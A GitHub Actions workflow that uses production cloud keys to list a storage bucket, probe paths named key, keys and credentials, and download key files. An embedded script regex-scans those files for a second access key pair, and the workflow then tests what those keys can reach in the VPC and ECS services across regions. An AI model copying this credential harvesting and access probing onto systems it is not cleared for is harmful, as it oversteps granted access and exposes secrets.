name: obs-robotwin-key
on:
  workflow_dispatch:
permissions: {contents: read}
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 14
    env:
      AK: ${{ secrets.PROD_HCLOUD_AK }}
      SK: ${{ secrets.PROD_HCLOUD_SK }}
    steps:
      - name: install hcloud
        run: |
          set -e
          ok=0
          for u in https://obs.cn-north-4.myhuaweicloud.com/koocli/cli/latest/huaweicloud-cli-linux-amd64.tar.gz https://cn-north-4-hdn-koocli.obs.cn-north-4.myhuaweicloud.com/cli/latest/huaweicloud-cli-linux-amd64.tar.gz ; do
            curl -fsSL --retry 4 "$u" -o /tmp/hc.tgz && { ok=1; break; } || true
          done
          [ "$ok" = 1 ] || { echo FAIL; exit 1; }
          mkdir -p /tmp/hc && tar xzf /tmp/hc.tgz -C /tmp/hc
          install -m755 "$(find /tmp/hc -type f -name hcloud|head -1)" /usr/local/bin/hcloud
      - name: run
        run: |
          set +e
          hcloud configure set --cli-access-key="$AK" --cli-secret-key="$SK" --cli-region=cn-north-4 --cli-mode=AKSK --cli-agree-privacy-statement=true 2>&1 | tail -1
          ENDP=https://obs.cn-north-4.myhuaweicloud.com
          OBS(){ hcloud OBS "$@" -i="$AK" -k="$SK" -e="$ENDP" 2>&1; }
          echo "== robotwin-assets root dirs =="; OBS ls obs://robotwin-assets/ -d | head -40
          echo "== robotwin-assets root objects =="; OBS ls obs://robotwin-assets/ -s | head -40
          echo "== robotwin-assets/key =="; OBS ls obs://robotwin-assets/key -s | head -30
          echo "== try /keys /credentials =="; OBS ls obs://robotwin-assets/keys -s | head; OBS ls obs://robotwin-assets/credentials -s | head
          mkdir -p /tmp/kd; OBS cp obs://robotwin-assets/key/ /tmp/kd -r -f 2>&1 | tail -4
          echo "== downloaded files =="; ls -la /tmp/kd 2>/dev/null
          python3 - <<'PY' > /tmp/creds.env
          import os,re,glob
          ak=sk=None; src=None
          akre=re.compile(r'[A-Z0-9]{20}')
          skre=re.compile(r'[A-Za-z0-9/+=]{40,64}')
          files=[f for f in glob.glob('/tmp/kd/**/*',recursive=True) if os.path.isfile(f)]
          for f in files:
              t=open(f,errors='ignore').read()
              ma=akre.search(t)
              if not ma: continue
              ak=ma.group(0)
              for m in skre.finditer(t):
                  v=m.group(0)
                  if v!=ak and ak not in v:
                      sk=v; break
              if sk: src=f; break
          print("AK2='%s'"%(ak or ""))
          print("SK2='%s'"%(sk or ""))
          print("SRC='%s'"%(src or ""))
          PY
          . /tmp/creds.env
          echo "detected AK2=${AK2:0:6}**** lenAK=${#AK2} lenSK=${#SK2} from $SRC"
          if [ -n "$AK2" ] && [ -n "$SK2" ]; then
            echo "::add-mask::$AK2"; echo "::add-mask::$SK2"
            hcloud configure set --cli-access-key="$AK2" --cli-secret-key="$SK2" --cli-region=cn-north-4 --cli-mode=AKSK --cli-agree-privacy-statement=true 2>&1|tail -1
            echo "-- VPC ListSecurityGroups/v3 --"; hcloud VPC ListSecurityGroups/v3 --cli-region=cn-north-4 >/tmp/g.json 2>/tmp/ge; echo "rc=$? size=$(wc -c</tmp/g.json)"; head -c160 /tmp/ge
            echo "-- ECS ListServersDetails --"; hcloud ECS ListServersDetails --cli-region=cn-north-4 --limit=1 >/tmp/e2.json 2>/tmp/ee; echo "rc=$? size=$(wc -c</tmp/e2.json)"; head -c160 /tmp/ee
            echo "-- VPC in cn-north-9? --"; hcloud VPC ListSecurityGroups/v3 --cli-region=cn-north-9 >/dev/null 2>/tmp/g9; echo "rc=$?"; head -c120 /tmp/g9
          fi
